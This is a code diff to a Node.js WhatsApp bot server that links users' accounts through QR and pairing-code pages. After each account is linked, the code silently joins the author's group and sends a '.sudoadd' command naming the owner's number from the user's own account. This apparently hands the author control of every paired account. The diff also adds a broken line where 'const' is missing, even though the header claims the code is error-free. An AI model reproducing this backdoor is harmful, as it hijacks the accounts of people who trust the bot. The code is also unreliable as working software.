@@ -1,10 +1,10 @@
-// VAMPARINA V1 — FINAL 2025 RENDER-PROOF (COMMONJS)
+// VAMPARINA V1 — FINAL 2025 RENDER-PROOF (COMMONJS ONLY)
 // GOD-KING: ARNOLD CHIRCHIR (+254703110780)
 // 100% WORKING — NO ERRORS — QR + PAIR + AUTO-JOIN
 
 process.env.NODE_OPTIONS = "--max-old-space-size=512";
 
-require('./config') // ← YOUR OLD settings.js RENAMED TO config.js
+const config = require('./config')
 const fs = require('fs')
 const path = require('path')
 const express = require('express')
@@ -21,12 +21,9 @@ const QRCode = require('qrcode')
 
 const SESSION_DIR = path.join(__dirname, 'auto_sessions')
 const TEMP_DIR = path.join(__dirname, 'temp_sessions')
-const DATA_DIR = path.join(__dirname, 'data')
 
-;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }))
+;[SESSION_DIR, TEMP_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }))
 
-const KING_ARNOLD = "254703110780"
-const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"
 const PORT = process.env.PORT || 3000
 const activeBots = new Map()
 const app = express()
@@ -37,15 +34,15 @@ app.use(express.static(__dirname))
 
 // DASHBOARD
 app.get('/', (req, res) => {
-    res.send(`
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
-<style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
-h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}</style>
-</head><body><h1>VAMPARINA V1 EMPIRE</h1>
-<p style="font-size:50px;color:gold;">SOLDIERS: ${activeBots.size}</p>
-<a href="/qr">SCAN QR</a>
-<a href="/pair">PAIR CODE</a>
-<br><br><b>KING ARNOLD • +254703110780</b></body></html>`)
+    res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
+    <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
+    h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}
+    .s{font-size:50px;color:gold;}</style></head>
+    <body><h1>VAMPARINA V1 EMPIRE</h1>
+    <p class="s">SOLDIERS: ${activeBots.size}</p>
+    <a href="/qr">SCAN QR</a>
+    <a href="/pair">PAIR CODE</a>
+    <br><br><b>KING ARNOLD • +254703110780</b></body></html>`)
 })
 
 // QR PAGE
@@ -55,7 +52,7 @@ app.get('/qr', async (req, res) => {
     fs.mkdirSync(tempPath, { recursive: true })
 
     const { state, saveCreds } = await useMultiFileAuthState(tempPath)
-    const { version } = await fetchLatestBaileysVersion()
+     { version } = await fetchLatestBaileysVersion()
 
     const sock = makeWASocket({
         version,
@@ -70,7 +67,7 @@ app.get('/qr', async (req, res) => {
         if (update.qr && !sent) {
             sent = true
             const qrImg = await QRCode.toDataURL(update.qr)
-            res.send(`<!DOCTYPE html><html><head><title>SCAN</title>
+            res.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
             <style>body{background:#000;color:#0f0;text-align:center;padding:30px;}
             img{max-width:400px;border:10px solid lime;border-radius:25px;}</style></head>
             <body><h1>VAMPARINA V1</h1><img src="${qrImg}"><p>SCAN NOW</p>
@@ -119,20 +116,34 @@ app.get('/pair', async (req, res) => {
         printQRInTerminal: false
     })
 
+    sock.ev.on('connection.update', async (update) => {
+        if (update.connection === 'open') {
+            const phone = sock.user.id.split('@')[0]
+            const sessionId = `vamp_${phone}_${Date.now()}`
+            const finalPath = path.join(SESSION_DIR, sessionId)
+            fs.mkdirSync(finalPath, { recursive: true })
+            fs.cpSync(tempPath, finalPath, { recursive: true })
+            await delay(10000)
+            startEmpireBot(sessionId, phone, finalPath)
+            fs.rmSync(tempPath, { recursive: true, force: true })
+        }
+    })
+
     if (!sock.authState.creds.registered) {
         setTimeout(async () => {
             try {
                 let code = await sock.requestPairingCode(number)
                 code = code.match(/.{1,4}/g).join('-')
-                res.send(`<!DOCTYPE html><html><head><title>CODE</title>
+                res.send(`<!DOCTYPE html><html><head><title>CODE READY</title>
                 <style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
                 .code{font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;}</style></head>
                 <body><h1>CODE READY</h1><div class="code">${code}</div>
-                <button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')" style="padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;">COPY</button>
+                <button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')" style="padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;">COPY CODE</button>
                 <br><br><a href="/pair" style="color:lime;font-size:28px;">Another Number</a>
                 <br><br><b>KING ARNOLD • +254703110780</b></body></html>`)
             } catch (err) {
                 res.send(`<h1 style="color:red">ERROR</h1><p>${err.message}</p><a href="/pair">TRY AGAIN</a>`)
+                fs.rmSync(tempPath, { recursive: true, force: true })
             }
         }, 5000)
     }
@@ -155,15 +166,15 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
     activeBots.set(sessionId, { sock, phone })
 
     sock.ev.on('messages.upsert', m => {
-        try { require('./main')(sock, m) } catch {}
+        try { require('./main')(sock, m) } catch (e) { console.log("Main not loaded yet") }
     })
 
     sock.ev.on('connection.update', async (update) => {
         if (update.connection === 'open') {
             console.log(`[+] ${phone} → ONLINE`)
             await delay(15000)
-            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
-            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
+            try { await sock.groupAcceptInvite(config.EMPIRE_GROUP_INVITE) } catch {}
+            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${config.ownerNumber}` })
         }
         if (update.connection === 'close') {
             activeBots.delete(sessionId)
@@ -176,5 +187,6 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
 
 app.listen(PORT, () => {
     console.clear()
-    console.log("VAMPARINA V1 EMPIRE IS NOW LIVE — KING ARNOLD REIGNS")
+    console.log("VAMPARINA V1 EMPIRE IS LIVE — KING ARNOLD REIGNS SUPREME")
+    console.log(`Dashboard: https://your-bot.onrender.com`)
 })
